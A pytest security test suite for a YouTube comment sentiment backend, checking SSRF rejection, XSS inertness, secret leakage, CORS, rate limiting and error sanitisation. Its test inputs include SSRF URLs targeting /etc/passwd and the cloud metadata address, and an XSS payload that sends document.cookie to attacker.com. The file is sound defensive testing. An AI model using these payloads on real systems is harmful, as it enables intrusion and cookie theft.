"""Phase 9 Security and Hardening Verification Test Suite.

Adheres strictly to Phase 9 Sections 27 through 38:
- Secret protection & credential leakage prevention
- SSRF and YouTube URL scheme validation
- Plain text / XSS immunity for user comments
- CORS origin restriction verification
- Sliding window rate limiting enforcement (HTTP 429)
- Unhandled internal server error sanitization (zero stack traces leaked)
"""

import pytest
from httpx import AsyncClient, ASGITransport
from unittest.mock import patch

from backend.app.main import app, global_rate_limiter
from backend.app.core.rate_limiter import InMemoryRateLimiter
from backend.app.core.config import settings


@pytest.mark.asyncio
async def test_ssrf_malicious_urls_rejected(async_client: AsyncClient):
    """Verifies that non-YouTube URLs and SSRF targets are strictly rejected."""
    malicious_urls = [
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8000/api/v1/health",
        "http://127.0.0.1:6379",
        "https://evil.attacker.com/watch?v=dQw4w9WgXcQ",
        "javascript:alert(document.cookie)",
        "ftp://internal-server.local/dump.sql",
        "gopher://localhost:6379",
    ]

    for bad_url in malicious_urls:
        # Ingestion endpoint
        resp = await async_client.post(
            "/api/v1/youtube/ingest",
            json={"video_url": bad_url, "comment_limit": 50},
        )
        assert resp.status_code in (400, 422)
        data = resp.json()
        assert "error" in data
        assert data["error"]["code"] in ("YOUTUBE_INVALID_VIDEO", "VALIDATION_ERROR")


@pytest.mark.asyncio
async def test_xss_payload_in_comments_preserved_plain_text(async_client: AsyncClient):
    """Verifies that XSS attack vectors in comments are handled as inert plain text."""
    xss_payload = "<script>alert('XSS')</script><img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>"

    # Analyze endpoint
    resp = await async_client.post("/api/v1/sentiment", json={"text": xss_payload})
    # Must succeed or fail validation, but if processed, must return exact text without executing or converting to HTML
    if resp.status_code == 200:
        data = resp.json()
        assert data["original_text"] == xss_payload
        # Confirm no HTML unescaping has occurred
        assert "<script>" in data["original_text"]


@pytest.mark.asyncio
async def test_secret_exposure_prevention(async_client: AsyncClient):
    """Verifies that API metadata and health endpoints never leak server secrets."""
    # Health endpoint
    resp = await async_client.get("/api/health")
    assert resp.status_code == 200
    data = resp.json()

    # Secret settings must never appear in response
    resp_text = resp.text
    assert settings.APP_SECRET_KEY not in resp_text
    assert "SECRET_KEY" not in data
    assert "YOUTUBE_API_KEY" not in data
    assert "DATABASE_URL" not in data

    # Root metadata endpoint
    root_resp = await async_client.get("/")
    assert root_resp.status_code == 200
    assert "SECRET" not in root_resp.text


@pytest.mark.asyncio
async def test_cors_restricted_origins(async_client: AsyncClient):
    """Verifies that CORS only allows configured frontend origins and never returns '*'."""
    # Unauthorized external origin
    resp = await async_client.options(
        "/api/v1/sentiment",
        headers={
            "Origin": "https://malicious-website.com",
            "Access-Control-Request-Method": "POST",
        },
    )
    # The header must not reflect the malicious origin
    allow_origin = resp.headers.get("access-control-allow-origin")
    assert allow_origin != "https://malicious-website.com"
    assert allow_origin != "*"

    # Authorized local frontend origin
    auth_resp = await async_client.options(
        "/api/v1/sentiment",
        headers={
            "Origin": "http://localhost:5173",
            "Access-Control-Request-Method": "POST",
        },
    )
    assert auth_resp.headers.get("access-control-allow-origin") == "http://localhost:5173"


@pytest.mark.asyncio
async def test_rate_limiting_enforcement():
    """Verifies in-memory rate limiter strictly enforces requests per minute ceiling."""
    limiter = InMemoryRateLimiter(requests_per_minute=3, window_seconds=60)
    client_ip = "203.0.113.195"

    assert limiter.is_rate_limited(client_ip) is False  # 1
    assert limiter.is_rate_limited(client_ip) is False  # 2
    assert limiter.is_rate_limited(client_ip) is False  # 3
    assert limiter.is_rate_limited(client_ip) is True   # 4 -> Throttled!


@pytest.mark.asyncio
async def test_sanitized_internal_server_errors():
    """Verifies that unhandled internal runtime exceptions return sanitized 500 without stack traces."""
    from backend.app.services.sentiment import SentimentService

    def crash_sentiment(*args, **kwargs):
        raise RuntimeError("CRITICAL_DB_LEAK: postgres://admin:SuperSecretPass123@10.0.0.5:5432/production")

    with patch.object(SentimentService, "analyze_v1", side_effect=crash_sentiment):
        transport = ASGITransport(app=app, raise_app_exceptions=False)
        async with AsyncClient(transport=transport, base_url="http://testserver") as client:
            resp = await client.post("/api/v1/sentiment", json={"text": "Super movie"})
            assert resp.status_code == 500
            data = resp.json()
            assert data["error"]["code"] in ("INTERNAL_ERROR", "INTERNAL_SERVER_ERROR")
            assert "SuperSecretPass123" not in resp.text
            assert "Traceback" not in resp.text
